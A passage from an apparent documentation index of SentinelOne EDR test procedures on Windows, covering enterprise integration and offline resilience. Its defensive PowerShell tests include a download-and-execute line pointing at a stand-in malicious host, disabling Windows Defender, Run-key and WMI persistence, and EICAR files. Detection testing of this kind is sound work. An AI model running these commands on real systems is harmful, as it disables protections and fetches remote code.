AppLocker/WDAC policies...\" -ForegroundColor Yellow\n$sentinelPath = \"C:\\Program Files\\SentinelOne\\*\"\n$appLockerPolicy = Get-AppLockerPolicy -Effective | Test-AppLockerPolicy -Path $sentinelPath -User \"Everyone\"\n\nif ($appLockerPolicy.PolicyDecision -eq \"Allowed\") {\n    Write-Host \"\u2705 SentinelOne path is whitelisted in AppLocker.\"\n} else {\n    Write-Host \"\u26a0\ufe0f  SentinelOne path may be blocked by AppLocker. Decision: $($appLockerPolicy.PolicyDecision)\" -ForegroundColor Yellow\n}\n\n# 4. Verify Registry-based Policy Settings\nWrite-Host \"Verifying registry-based policy settings...\" -ForegroundColor Yellow\n$sentinelPolicyPath = \"HKLM:\\SOFTWARE\\Policies\\SentinelOne\"\nif (Test-Path $sentinelPolicyPath) {\n    $policySettings = Get-ItemProperty -Path $sentinelPolicyPath\n    Write-Host \"SentinelOne GPO policies found:\"\n    $policySettings | Format-List\n} else {\n    Write-Host \"No custom GPO registry settings for SentinelOne found.\"\n}\n</code></pre>"},{"location":"testing/windows/windows-enterprise/#f2-active-directory-integration-testing","title":"\ud83e\udd1d F2: Active Directory Integration Testing","text":""},{"location":"testing/windows/windows-enterprise/#f21-device-and-user-information-enrichment","title":"F2.1: Device and User Information Enrichment","text":"<pre><code># Verify Active Directory information in SentinelOne console\n# This is a conceptual test, as it requires checking the console UI\n\nWrite-Host \"=== Active Directory Integration Validation ===\" -ForegroundColor Green\n\n# Step 1: Get local Active Directory information\nWrite-Host \"Local AD Information:\" -ForegroundColor Yellow\n$computerInfo = Get-ADComputer -Identity $env:COMPUTERNAME -Properties *\nWrite-Host \"Computer Name: $($computerInfo.Name)\"\nWrite-Host \"Distinguished Name: $($computerInfo.DistinguishedName)\"\nWrite-Host \"Operating System: $($computerInfo.OperatingSystem)\"\n\n$userInfo = Get-ADUser -Identity $env:USERNAME -Properties *\nWrite-Host \"User Name: $($userInfo.SamAccountName)\"\nWrite-Host \"User Distinguished Name: $($userInfo.DistinguishedName)\"\nWrite-Host \"Member Of: $($userInfo.MemberOf -join \", \")\"\n\n# Step 2: Compare with information in SentinelOne console\nWrite-Host \"`nSentinelOne Console Validation:\" -ForegroundColor Yellow\nWrite-Host \"1. Navigate to the endpoint in the SentinelOne console.\"\nWrite-Host \"2. Verify that the endpoint details match the local AD information.\"\nWrite-Host \"   - Check fields like 'Distinguished Name', 'Organizational Unit', 'Logged In User'.\"\nWrite-Host \"3. Check for user group information in the user details.\"\n\n# Step 3: Test dynamic updates\nWrite-Host \"`nTesting Dynamic Updates:\" -ForegroundColor Yellow\nWrite-Host \"1. Move the computer object to a different OU in Active Directory.\"\nWrite-Host \"2. Wait for the SentinelOne agent to sync (up to a few hours).\"\nWrite-Host \"3. Verify that the OU information is updated in the console.\"\n</code></pre>"},{"location":"testing/windows/windows-enterprise/#f22-group-based-policy-assignment","title":"F2.2: Group-based Policy Assignment","text":"<pre><code># Test policy assignment based on AD security groups\nWrite-Host \"=== AD Group-based Policy Assignment Testing ===\" -ForegroundColor Green\n\n# Step 1: Create a test AD security group and add the user\nWrite-Host \"Creating test AD security group...\" -ForegroundColor Yellow\n# (This step is performed by an AD administrator)\n# New-ADGroup -Name \"S1_Test_Policy_Group\" -GroupScope Global\n# Add-ADGroupMember -Identity \"S1_Test_Policy_Group\" -Members $env:USERNAME\n\n# Step 2: Configure a policy in SentinelOne for this group\nWrite-Host \"Configuring policy in SentinelOne console...\" -ForegroundColor Yellow\nWrite-Host \"1. Create a new policy in SentinelOne (e.g., 'Test Policy').\"\nWrite-Host \"2. Set a unique setting in this policy (e.g., enable 'Detect Only' mode).\"\nWrite-Host \"3. In the policy's scope, select 'Directory', and add the 'S1_Test_Policy_Group'.\"\n\n# Step 3: Verify policy application on the endpoint\nWrite-Host \"Verifying policy application...\" -ForegroundColor Yellow\nWrite-Host \"Forcing agent to sync with console...\"\n&amp; \"C:\\Program Files\\SentinelOne\\Sentinel Agent\\SentinelCtl.exe\" policy refresh\nStart-Sleep -Seconds 20\n\n$policyStatus = &amp; \"C:\\Program Files\\SentinelOne\\Sentinel Agent\\SentinelCtl.exe\" status\nif ($policyStatus -match \"Detect Only\") {\n    Write-Host \"\u2705 Policy based on AD group membership applied successfully.\"\n} else {\n    Write-Host \"\u26a0\ufe0f  Policy not applied. Current status: $policyStatus\" -ForegroundColor Red\n}\n\n# Step 4: Cleanup\nWrite-Host \"Cleaning up test group...\" -ForegroundColor Yellow\n# (Performed by an AD administrator)\n# Remove-ADGroup -Identity \"S1_Test_Policy_Group\" -Confirm:$false\n</code></pre>"},{"location":"testing/windows/windows-enterprise/#f3-enterprise-application-compatibility","title":"\ud83d\udee1\ufe0f F3: Enterprise Application Compatibility","text":""},{"location":"testing/windows/windows-enterprise/#f31-microsoft-exchange-server-exclusions","title":"F3.1: Microsoft Exchange Server Exclusions","text":"<pre><code># Verify exclusions for Microsoft Exchange Server\nWrite-Host \"=== Exchange Server Exclusion Validation ===\" -ForegroundColor Green\n\n# Microsoft's recommended antivirus exclusions for Exchange\n$exchangePaths = @(\n    \"%SystemRoot%\\System32\\Inetsrv\",\n    \"%ExchangeInstallPath%\",\n    \"%SystemDrive%\\inetpub\\temp\\IIS Temporary Compressed Files\"\n)\n\n$exchangeProcesses = @(\n    \"EdgeTransport.exe\",\n    \"MSExchangeADTopologyService.exe\",\n    \"MSExchangeTransport.exe\",\n    \"MSExchangeMailboxReplication.exe\",\n    \"noderunner.exe\"\n)\n\n$exchangeFileTypes = @(\n    \".config\",\n    \".dia\",\n    \".wsb\",\n    \".que\",\n    \".log\"\n)\n\n# Check if these are excluded in SentinelOne\nWrite-Host \"This test is conceptual. You need to check the SentinelOne console.\"\nWrite-Host \"Ensure the following are in your SentinelOne exclusion policy for Exchange servers:\"\n\nWrite-Host \"`nPath Exclusions:\" -ForegroundColor Yellow\n$exchangePaths | ForEach-Object { Write-Host \"- $_\" }\n\nWrite-Host \"`nProcess Exclusions:\" -ForegroundColor Yellow\n$exchangeProcesses | ForEach-Object { Write-Host \"- $_\" }\n\nWrite-Host \"`nFile Type Exclusions:\" -ForegroundColor Yellow\n$exchangeFileTypes | ForEach-Object { Write-Host \"- $_\" }\n\n# Performance test during high email flow\nWrite-Host \"`nPerformance Testing:\" -ForegroundColor Yellow\nWrite-Host \"1. Use a tool like Exchange Load Generator to simulate high email flow.\"\nWrite-Host \"2. Monitor CPU, Memory, and Disk I/O on the Exchange server.\"\nWrite-Host \"3. Ensure SentinelOne's impact is within acceptable limits (&lt; 10% overhead).\"\n</code></pre>"},{"location":"testing/windows/windows-enterprise/#f32-sql-server-compatibility","title":"F3.2: SQL Server Compatibility","text":"<pre><code># Verify exclusions and performance for SQL Server\nWrite-Host \"=== SQL Server Compatibility and Performance Validation ===\" -ForegroundColor Green\n\n# Recommended exclusions for SQL Server\n$sqlPaths = @(\n    \"%ProgramFiles%\\Microsoft SQL Server\\\",\n    \"%SystemDrive%\\MSSQL\\DATA\\\"\n)\n\n$sqlProcesses = @(\n    \"sqlservr.exe\",\n    \"sqlagent.exe\"\n)\n\n$sqlFileTypes = @(\n    \".mdf\",\n    \".ldf\",\n    \".ndf\",\n    \".bak\",\n    \".trn\"\n)\n\n# Check if these are excluded in SentinelOne\nWrite-Host \"Check the SentinelOne console for the following exclusions on SQL servers:\"\n\nWrite-Host \"`nPath Exclusions:\" -ForegroundColor Yellow\n$sqlPaths | ForEach-Object { Write-Host \"- $_\" }\n\nWrite-Host \"`nProcess Exclusions:\" -ForegroundColor Yellow\n$sqlProcesses | ForEach-Object { Write-Host \"- $_\" }\n\nWrite-Host \"`nFile Type Exclusions:\" -ForegroundColor Yellow\n$sqlFileTypes | ForEach-Object { Write-Host \"- $_\" }\n\n# Performance test during high database load\nWrite-Host \"`nPerformance Testing:\" -ForegroundColor Yellow\nWrite-Host \"1. Use a tool like HammerDB to generate a high-transaction workload (OLTP).\"\nWrite-Host \"2. Monitor performance counters like 'SQL Server:Buffer Manager\\Page life expectancy' and 'Processor\\% Processor Time'.\"\nWrite-Host \"3. Compare performance with and without SentinelOne agent active.\"\nWrite-Host \"4. Ensure Page Life Expectancy does not drop significantly and CPU overhead is minimal.\"\n</code></pre>"},{"location":"testing/windows/windows-enterprise/#f4-virtual-desktop-infrastructure-vdi-testing","title":"\ud83d\udda5\ufe0f F4: Virtual Desktop Infrastructure (VDI) Testing","text":""},{"location":"testing/windows/windows-enterprise/#f41-vdi-golden-image-preparation","title":"F4.1: VDI Golden Image Preparation","text":"<pre><code># Script to prepare SentinelOne agent in a VDI golden image\nWrite-Host \"=== VDI Golden Image Preparation Script ===\" -ForegroundColor Green\n\n# Step 1: Install the agent\nWrite-Host \"Installing SentinelOne agent...\"\n# (Use your silent installation command here)\n# msiexec /i SentinelInstaller.msi /quiet SITE_TOKEN=your_token\n\n# Step 2: Stop the agent services\nWrite-Host \"Stopping agent services...\"\nGet-Service | Where-Object {$_.Name -like \"*Sentinel*\"} | Stop-Service -Force\n\n# Step 3: Run the VDI preparation command\n# This command removes unique identifiers so that cloned VMs register as new endpoints\nWrite-Host \"Running VDI preparation command...\"\n$sentinelCtl = \"C:\\Program Files\\SentinelOne\\Sentinel Agent\\SentinelCtl.exe\"\nif (Test-Path $sentinelCtl) {\n    &amp; $sentinelCtl vdi-prepare\n    Write-Host \"\u2705 VDI preparation command executed.\"\n} else {\n    Write-Host \"\u26a0\ufe0f  sentinelctl.exe not found.\" -ForegroundColor Red\n    exit 1\n}\n\n# Step 4: Clear event logs (optional)\n# Clear-EventLog -LogName Application, System\n\n# Step 5: Shut down the golden image\nWrite-Host \"Golden image is ready to be shut down and used as a template.\"\nWrite-Host \"DO NOT restart this VM before creating the template.\"\n# Stop-Computer -Force\n</code></pre>"},{"location":"testing/windows/windows-enterprise/#f42-vdi-clone-validation-boot-storm-test","title":"F4.2: VDI Clone Validation (Boot Storm Test)","text":"<pre><code># Conceptual test for VDI boot storm\nWrite-Host \"=== VDI Boot Storm Validation ===\" -ForegroundColor Green\n\n# Step 1: Provision a pool of VDI desktops from the golden image\nWrite-Host \"Provisioning 50 VDI desktops...\" -ForegroundColor Yellow\n# (This is done using your VDI management tool like Citrix, VMware Horizon, etc.)\n\n# Step 2: Initiate a boot storm\nWrite-Host \"Initiating a boot storm by starting all 50 desktops simultaneously.\"\n\n# Step 3: Monitor performance on the hypervisor\nWrite-Host \"Monitoring Hypervisor Performance:\" -ForegroundColor Yellow\nWrite-Host \"- Monitor CPU, Memory, and Disk I/O on the hypervisor hosts.\"\nWrite-Host \"- Pay close attention to storage latency (datastore latency).\"\nWrite-Host \"- Objective: SentinelOne's initial sync and scan should not cause a significant increase in boot times or resource contention.\"\n\n# Step 4: Validate agent registration in the console\nWrite-Host \"Validating Agent Registration:\" -ForegroundColor Yellow\nWrite-Host \"- Verify that all 50 new desktops appear in the SentinelOne console as unique endpoints.\"\nWrite-Host \"- Check that they are assigned the correct policy.\"\n\n# Step 5: Test user login performance\nWrite-Host \"Testing User Login Performance:\" -ForegroundColor Yellow\nWrite-Host \"- Measure the time it takes for a user to log in and get a responsive desktop.\"\nWrite-Host \"- Compare this with a baseline without the SentinelOne agent.\"\nWrite-Host \"- Objective: Login time increase should be minimal (&lt; 10-15%).\"\n</code></pre>"},{"location":"testing/windows/windows-enterprise/#validation-checklist","title":"\ud83d\udcca Validation Checklist","text":""},{"location":"testing/windows/windows-enterprise/#enterprise-integration","title":"Enterprise Integration","text":"<ul> <li>[ ] SCCM Deployment: Agent deploys successfully to target collections</li> <li>[ ] GPO Policies: Agent configuration is correctly enforced by GPO</li> <li>[ ] AD Enrichment: Endpoint details in console are enriched with AD data</li> <li>[ ] Group-based Policies: Policies are correctly applied based on AD groups</li> </ul>"},{"location":"testing/windows/windows-enterprise/#application-compatibility","title":"Application Compatibility","text":"<ul> <li>[ ] Exchange Exclusions: Correct exclusions are in place</li> <li>[ ] Exchange Performance: No significant performance degradation during high load</li> <li>[ ] SQL Server Exclusions: Correct exclusions are in place for data, log, and backup files</li> <li>[ ] SQL Server Performance: No significant impact on transaction throughput or query times</li> <li>[ ] Other LOB Applications: Key line-of-business apps are tested and performant</li> </ul>"},{"location":"testing/windows/windows-enterprise/#vdi-environment","title":"VDI Environment","text":"<ul> <li>[ ] Golden Image Prep: <code>vdi-prepare</code> command is used correctly</li> <li>[ ] Unique Registration: Cloned VMs register as unique endpoints</li> <li>[ ] Boot Storm Impact: Minimal impact on hypervisor during boot storm</li> <li>[ ] Login VSI Score: Login VSI benchmark score remains high</li> <li>[ ] Non-persistent Desktops: Agent functions correctly on non-persistent desktops and cleans up properly on logoff</li> </ul>"},{"location":"testing/windows/windows-enterprise/#next-steps","title":"Next Steps","text":"<p>Continue with: - Windows Performance Testing - Windows Offline Testing - Cross-Platform Enterprise Scenarios</p> <p>Last updated: 6 Agustus 2025</p>"},{"location":"testing/windows/windows-offline/","title":"Windows Offline Testing Scenarios","text":""},{"location":"testing/windows/windows-offline/#overview","title":"Overview","text":"<p>Pengujian komprehensif kemampuan SentinelOne EDR dalam kondisi offline atau terputus dari management console pada sistem Windows Server.</p>"},{"location":"testing/windows/windows-offline/#b1-windows-network-disconnection-testing","title":"\ud83d\udd0c B1: Windows Network Disconnection Testing","text":""},{"location":"testing/windows/windows-offline/#tujuan","title":"Tujuan","text":"<p>Memvalidasi behavior SentinelOne agent ketika koneksi network terputus pada sistem Windows.</p>"},{"location":"testing/windows/windows-offline/#prerequisites","title":"Prerequisites","text":"<ul> <li>[ ] SentinelOne Agent terinstall dan aktif</li> <li>[ ] Policy sudah di-sync sebelum test</li> <li>[ ] Administrator privileges</li> <li>[ ] Windows Firewall access</li> </ul>"},{"location":"testing/windows/windows-offline/#test-scenarios","title":"Test Scenarios","text":""},{"location":"testing/windows/windows-offline/#b11-windows-firewall-based-network-isolation","title":"B1.1: Windows Firewall-based Network Isolation","text":"<pre><code># Windows Network Isolation Test Script\nWrite-Host \"=== Windows Network Disconnection Test ===\" -ForegroundColor Green\n\n# Step 1: Check initial agent status\nWrite-Host \"Initial agent status:\" -ForegroundColor Yellow\n&amp; \"C:\\Program Files\\SentinelOne\\Sentinel Agent\\SentinelCtl.exe\" status\n\n# Step 2: Block SentinelOne communication using Windows Firewall\nWrite-Host \"Blocking SentinelOne network traffic...\" -ForegroundColor Yellow\nNew-NetFirewallRule -DisplayName \"Block SentinelOne Outbound\" -Direction Outbound -RemoteAddress *.sentinelone.net -Action Block\nNew-NetFirewallRule -DisplayName \"Block HTTPS to SentinelOne\" -Direction Outbound -Protocol TCP -RemotePort 443 -Action Block\n\n# Step 3: Verify network isolation\nWrite-Host \"Testing network isolation:\" -ForegroundColor Yellow\nTest-NetConnection console.sentinelone.net -Port 443 -WarningAction SilentlyContinue\nif (-not $?) {\n    Write-Host \"\u2705 Network successfully isolated\" -ForegroundColor Green\n}\n\n# Step 4: Test malware detection while offline\nWrite-Host \"Creating EICAR test file while offline:\" -ForegroundColor Yellow\n$eicarString = 'X5O!P%@AP[4\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*'\n$eicarString | Out-File -FilePath \"C:\\temp\\eicar_offline.txt\" -Encoding ASCII\n\n# Expected Result: File should still be detected and quarantined\nStart-Sleep -Seconds 5\nif (-not (Test-Path \"C:\\temp\\eicar_offline.txt\")) {\n    Write-Host \"\u2705 File quarantined while offline\" -ForegroundColor Green\n} else {\n    Write-Host \"\u26a0\ufe0f  File detection needs verification\" -ForegroundColor Yellow\n}\n\n# Step 5: Check local event logs for offline detection\nWrite-Host \"Checking Windows Event Logs for offline detection:\" -ForegroundColor Yellow\nGet-WinEvent -FilterHashtable @{LogName='Application'; ProviderName='SentinelOne'} -MaxEvents 10 | \n    Where-Object {$_.Message -match \"eicar|threat\"} | \n    Select-Object TimeCreated, Id, LevelDisplayName, Message\n\n# Step 6: Restore network connectivity\nWrite-Host \"Restoring network connectivity...\" -ForegroundColor Yellow\nRemove-NetFirewallRule -DisplayName \"Block SentinelOne Outbound\" -ErrorAction SilentlyContinue\nRemove-NetFirewallRule -DisplayName \"Block HTTPS to SentinelOne\" -ErrorAction SilentlyContinue\n\n# Step 7: Wait for sync\nWrite-Host \"Waiting for agent to reconnect...\" -ForegroundColor Yellow\nStart-Sleep -Seconds 30\n&amp; \"C:\\Program Files\\SentinelOne\\Sentinel Agent\\SentinelCtl.exe\" status\n</code></pre>"},{"location":"testing/windows/windows-offline/#b12-network-interface-disable-simulation","title":"B1.2: Network Interface Disable Simulation","text":"<pre><code># Simulate network interface disable\nWrite-Host \"=== Network Interface Disable Simulation ===\" -ForegroundColor Green\n\n# Get primary network adapter\n$primaryAdapter = Get-NetAdapter | Where-Object {$_.Status -eq \"Up\" -and $_.InterfaceDescription -notlike \"*Loopback*\"} | Select-Object -First 1\nWrite-Host \"Primary adapter: $($primaryAdapter.Name)\" -ForegroundColor Yellow\n\n# Disable network adapter\nWrite-Host \"Disabling network adapter...\" -ForegroundColor Yellow\nDisable-NetAdapter -Name $primaryAdapter.Name -Confirm:$false\n\n# Create test threat\n$eicarString = 'X5O!P%@AP[4\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*'\n$eicarString | Out-File -FilePath \"C:\\temp\\eicar_ifdown.txt\" -Encoding ASCII\n\n# Check agent behavior\n&amp; \"C:\\Program Files\\SentinelOne\\Sentinel Agent\\SentinelCtl.exe\" status\n\n# Re-enable adapter\nWrite-Host \"Re-enabling network adapter...\" -ForegroundColor Yellow\nEnable-NetAdapter -Name $primaryAdapter.Name -Confirm:$false\n\n# Wait for network to come back\nWrite-Host \"Waiting for network recovery...\" -ForegroundColor Yellow\ndo {\n    Start-Sleep -Seconds 5\n    $connectionTest = Test-NetConnection -ComputerName \"8.8.8.8\" -InformationLevel Quiet\n} while (-not $connectionTest)\n\n# Verify reconnection\nStart-Sleep -Seconds 30\n&amp; \"C:\\Program Files\\SentinelOne\\Sentinel Agent\\SentinelCtl.exe\" status\n</code></pre>"},{"location":"testing/windows/windows-offline/#b2-windows-service-resilience-testing","title":"\ud83d\udee0\ufe0f B2: Windows Service Resilience Testing","text":""},{"location":"testing/windows/windows-offline/#test-service-restart-behavior","title":"Test Service Restart Behavior","text":"<pre><code># Windows Service Resilience Test\nWrite-Host \"=== Windows Service Resilience Testing ===\" -ForegroundColor Green\n\n# Step 1: Get SentinelOne service information\n$sentinelServices = Get-Service | Where-Object {$_.Name -like \"*Sentinel*\"}\nWrite-Host \"SentinelOne Services:\" -ForegroundColor Yellow\n$sentinelServices | Format-Table Name, Status, StartType\n\n# Step 2: Stop SentinelOne services\nWrite-Host \"Stopping SentinelOne services...\" -ForegroundColor Yellow\nforeach ($service in $sentinelServices) {\n    if ($service.Status -eq \"Running\") {\n        Write-Host \"Stopping service: $($service.Name)\"\n        Stop-Service -Name $service.Name -Force\n    }\n}\n\n# Step 3: Create threat while services are down\nWrite-Host \"Creating threat while services are stopped...\" -ForegroundColor Yellow\n$eicarString = 'X5O!P%@AP[4\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*'\n$eicarString | Out-File -FilePath \"C:\\temp\\eicar_service_down.txt\" -Encoding ASCII\n\n# Step 4: Start SentinelOne services\nWrite-Host \"Starting SentinelOne services...\" -ForegroundColor Yellow\nforeach ($service in $sentinelServices) {\n    if ($service.StartType -ne \"Disabled\") {\n        Write-Host \"Starting service: $($service.Name)\"\n        Start-Service -Name $service.Name\n    }\n}\n\n# Step 5: Wait for services to fully start\nStart-Sleep -Seconds 15\n\n# Step 6: Check if threat is detected on startup\nif (-not (Test-Path \"C:\\temp\\eicar_service_down.txt\")) {\n    Write-Host \"\u2705 Threat detected after service restart\" -ForegroundColor Green\n} else {\n    Write-Host \"\u26a0\ufe0f  Threat detection needs verification\" -ForegroundColor Yellow\n}\n\n# Step 7: Verify service auto-recovery\nWrite-Host \"Service status after restart:\" -ForegroundColor Yellow\nGet-Service | Where-Object {$_.Name -like \"*Sentinel*\"} | Format-Table Name, Status\n</code></pre>"},{"location":"testing/windows/windows-offline/#b3-windows-policy-cache-validation","title":"\ud83d\udd04 B3: Windows Policy Cache Validation","text":""},{"location":"testing/windows/windows-offline/#test-cached-policy-enforcement","title":"Test Cached Policy Enforcement","text":"<pre><code># Windows Policy Cache Validation Test\nWrite-Host \"=== Windows Policy Cache Validation ===\" -ForegroundColor Green\n\n# Step 1: Verify current policy\nWrite-Host \"Current policy status:\" -ForegroundColor Yellow\n&amp; \"C:\\Program Files\\SentinelOne\\Sentinel Agent\\SentinelCtl.exe\" policy show\n\n# Step 2: Disconnect from network using firewall rules\nWrite-Host \"Disconnecting from network...\" -ForegroundColor Yellow\nNew-NetFirewallRule -DisplayName \"Block All SentinelOne\" -Direction Outbound -RemoteAddress *.sentinelone.net -Action Block\n\n# Step 3: Test policy enforcement while offline\nWrite-Host \"Testing policy enforcement while offline...\" -ForegroundColor Yellow\n\n# Create test directory\nNew-Item -Path \"C:\\temp\\policy_test\" -ItemType Directory -Force\n\n# Create various test files to trigger different policy rules\n$eicarString = 'X5O!P%@AP[4\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*'\n$eicarString | Out-File -FilePath \"C:\\temp\\policy_test\\eicar.txt\" -Encoding ASCII\n\n# Create large file\n$largeContent = \"A\" * (100 * 1024 * 1024)  # 100MB\n$largeContent | Out-File -FilePath \"C:\\temp\\policy_test\\largefile.txt\" -Encoding ASCII\n\n# Copy executable\nCopy-Item -Path \"C:\\Windows\\System32\\calc.exe\" -Destination \"C:\\temp\\policy_test\\suspicious.exe\"\n\n# Step 4: Check enforcement results\nStart-Sleep -Seconds 10\nWrite-Host \"Policy test directory contents:\" -ForegroundColor Yellow\nif (Test-Path \"C:\\temp\\policy_test\") {\n    Get-ChildItem \"C:\\temp\\policy_test\" | Format-Table Name, Length, LastWriteTime\n} else {\n    Write-Host \"\u2705 Policy enforced - directory blocked\" -ForegroundColor Green\n}\n\n# Step 5: Restore connectivity\nWrite-Host \"Restoring network connectivity...\" -ForegroundColor Yellow\nRemove-NetFirewallRule -DisplayName \"Block All SentinelOne\" -ErrorAction SilentlyContinue\n\n# Step 6: Wait for policy sync\nStart-Sleep -Seconds 30\n&amp; \"C:\\Program Files\\SentinelOne\\Sentinel Agent\\SentinelCtl.exe\" policy refresh\n\n# Cleanup\nRemove-Item -Path \"C:\\temp\\policy_test\" -Recurse -Force -ErrorAction SilentlyContinue\n</code></pre>"},{"location":"testing/windows/windows-offline/#b4-windows-registry-protection-testing","title":"\ud83d\udd10 B4: Windows Registry Protection Testing","text":""},{"location":"testing/windows/windows-offline/#test-registry-protection-while-offline","title":"Test Registry Protection While Offline","text":"<pre><code># Windows Registry Protection Test\nWrite-Host \"=== Windows Registry Protection Testing ===\" -ForegroundColor Green\n\n# Step 1: Disconnect from network\nWrite-Host \"Disconnecting from network...\" -ForegroundColor Yellow\nNew-NetFirewallRule -DisplayName \"Block Registry Test\" -Direction Outbound -RemoteAddress *.sentinelone.net -Action Block\n\n# Step 2: Attempt suspicious registry modifications\nWrite-Host \"Testing registry protection while offline...\" -ForegroundColor Yellow\n\n# Test 1: Attempt to modify Windows Defender settings\ntry {\n    Set-ItemProperty -Path \"HKLM:\\SOFTWARE\\Microsoft\\Windows Defender\" -Name \"DisableAntiSpyware\" -Value 1 -ErrorAction Stop\n    Write-Host \"\u26a0\ufe0f  Registry modification allowed\" -ForegroundColor Yellow\n} catch {\n    Write-Host \"\u2705 Registry modification blocked\" -ForegroundColor Green\n}\n\n# Test 2: Attempt to add startup item\ntry {\n    New-ItemProperty -Path \"HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\" -Name \"SuspiciousApp\" -Value \"C:\\temp\\malware.exe\" -ErrorAction Stop\n    Write-Host \"\u26a0\ufe0f  Startup item creation allowed\" -ForegroundColor Yellow\n} catch {\n    Write-Host \"\u2705 Startup item creation blocked\" -ForegroundColor Green\n}\n\n# Test 3: Attempt to disable system services\ntry {\n    Set-Service -Name \"WinDefend\" -StartupType Disabled -ErrorAction Stop\n    Write-Host \"\u26a0\ufe0f  Service modification allowed\" -ForegroundColor Yellow\n} catch {\n    Write-Host \"\u2705 Service modification blocked\" -ForegroundColor Green\n}\n\n# Step 3: Check Windows Event Logs for protection events\nWrite-Host \"Checking event logs for protection events:\" -ForegroundColor Yellow\nGet-WinEvent -FilterHashtable @{LogName='System'; Id=7036} -MaxEvents 5 | \n    Where-Object {$_.Message -match \"SentinelOne\"} | \n    Select-Object TimeCreated, Id, LevelDisplayName, Message\n\n# Step 4: Restore connectivity\nWrite-Host \"Restoring network connectivity...\" -ForegroundColor Yellow\nRemove-NetFirewallRule -DisplayName \"Block Registry Test\" -ErrorAction SilentlyContinue\n\n# Step 5: Cleanup any test registry entries\nRemove-ItemProperty -Path \"HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\" -Name \"SuspiciousApp\" -ErrorAction SilentlyContinue\n</code></pre>"},{"location":"testing/windows/windows-offline/#validation-metrics","title":"\ud83d\udcca Validation Metrics","text":""},{"location":"testing/windows/windows-offline/#expected-results","title":"Expected Results","text":"Test Scenario Expected Behavior Pass Criteria Network Disconnection Continue threat detection locally EICAR detected and quarantined Service Restart Resume protection immediately Service starts &lt; 30 seconds Policy Cache Enforce cached policies Policies remain active offline Registry Protection Block suspicious modifications Registry changes prevented Connectivity Recovery Auto-sync when online Status shows \"Online\" within 60s"},{"location":"testing/windows/windows-offline/#windows-specific-validation","title":"Windows-Specific Validation","text":""},{"location":"testing/windows/windows-offline/#service-integration","title":"Service Integration","text":"<ul> <li>[ ] Service Recovery: Services auto-restart after failure</li> <li>[ ] Service Dependencies: Proper dependency management maintained</li> <li>[ ] Service Permissions: Adequate permissions for offline operation</li> <li>[ ] Service Logging: Events logged to Windows Event Log</li> </ul>"},{"location":"testing/windows/windows-offline/#registry-protection","title":"Registry Protection","text":"<ul> <li>[ ] Critical Keys Protected: System-critical registry keys protected</li> <li>[ ] Startup Protection: Malicious startup entries blocked</li> <li>[ ] Policy Registry: SentinelOne policies stored securely</li> <li>[ ] Recovery Mechanisms: Registry protection recovers from tampering</li> </ul>"},{"location":"testing/windows/windows-offline/#event-log-integration","title":"Event Log Integration","text":"<ul> <li>[ ] Application Log: SentinelOne events in Application log</li> <li>[ ] Security Log: Security events properly logged</li> <li>[ ] System Log: Service events in System log</li> <li>[ ] Custom Logs: SentinelOne-specific logs available</li> </ul>"},{"location":"testing/windows/windows-offline/#powershell-integration-testing","title":"\ud83d\udd27 PowerShell Integration Testing","text":""},{"location":"testing/windows/windows-offline/#advanced-powershell-protection","title":"Advanced PowerShell Protection","text":"<pre><code># PowerShell Protection Test While Offline\nWrite-Host \"=== PowerShell Protection Testing ===\" -ForegroundColor Green\n\n# Disconnect from network\nNew-NetFirewallRule -DisplayName \"PS Test Block\" -Direction Outbound -RemoteAddress *.sentinelone.net -Action Block\n\n# Test 1: Encoded command execution\n$encodedCommand = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes(\"Write-Host 'This is a test'\"))\ntry {\n    powershell.exe -EncodedCommand $encodedCommand\n    Write-Host \"\u2705 Encoded command executed (expected)\" -ForegroundColor Green\n} catch {\n    Write-Host \"\u26a0\ufe0f  Legitimate encoded command blocked\" -ForegroundColor Yellow\n}\n\n# Test 2: Suspicious PowerShell activity\n$suspiciousCommand = @\"\nIEX (New-Object Net.WebClient).DownloadString('http://malicious-site.com/payload.ps1')\n\"@\n\ntry {\n    Invoke-Expression $suspiciousCommand\n    Write-Host \"\u26a0\ufe0f  Suspicious command executed\" -ForegroundColor Red\n} catch {\n    Write-Host \"\u2705 Suspicious PowerShell activity blocked\" -ForegroundColor Green\n}\n\n# Test 3: WMI-based persistence attempt\ntry {\n    $filterName = 'TestFilter'\n    $query = \"SELECT * FROM Win32_VolumeChangeEvent WHERE EventType = 2\"\n    $wmiFilter = Set-WmiInstance -Class __EventFilter -Namespace \"root\\subscription\" -Arguments @{Name=$filterName; EventNameSpace=\"root\\cimv2\"; QueryLanguage=\"WQL\"; Query=$query}\n    Write-Host \"\u26a0\ufe0f  WMI persistence created\" -ForegroundColor Yellow\n} catch {\n    Write-Host \"\u2705 WMI persistence attempt blocked\" -ForegroundColor Green\n}\n\n# Restore connectivity\nRemove-NetFirewallRule -DisplayName \"PS Test Block\" -ErrorAction SilentlyContinue\n\n# Cleanup\nGet-WmiObject -Class __EventFilter -Namespace \"root\\subscription\" | Where-Object {$_.Name -eq 'TestFilter'} | Remove-WmiObject -ErrorAction SilentlyContinue\n</code></pre>"},{"location":"testing/windows/windows-offline/#validation-checklist","title":"Validation Checklist","text":""},{"location":"testing/windows/windows-offline/#network-disconnection-validation","title":"Network Disconnection Validation","text":"<ul> <li>[ ] Offline Detection: Threats detected without internet connection</li> <li>[ ] Local Quarantine: Malicious files quarantined locally</li> <li>[ ] Policy Enforcement: Cached policies remain active</li> <li>[ ] Event Logging: Activities logged locally</li> <li>[ ] Auto-Reconnection: Agent reconnects when network restored</li> </ul>"},{"location":"testing/windows/windows-offline/#service-resilience-validation","title":"Service Resilience Validation","text":"<ul> <li>[ ] Service Stability: Services remain stable during network issues</li> <li>[ ] Auto-Recovery: Services auto-restart after crashes</li> <li>[ ] Dependency Management: Service dependencies properly managed</li> <li>[ ] Performance Impact: Minimal performance impact during offline mode</li> </ul>"},{"location":"testing/windows/windows-offline/#windows-specific-protection","title":"Windows-Specific Protection","text":"<ul> <li>[ ] Registry Protection: Critical registry keys protected offline</li> <li>[ ] PowerShell Monitoring: PowerShell activities monitored 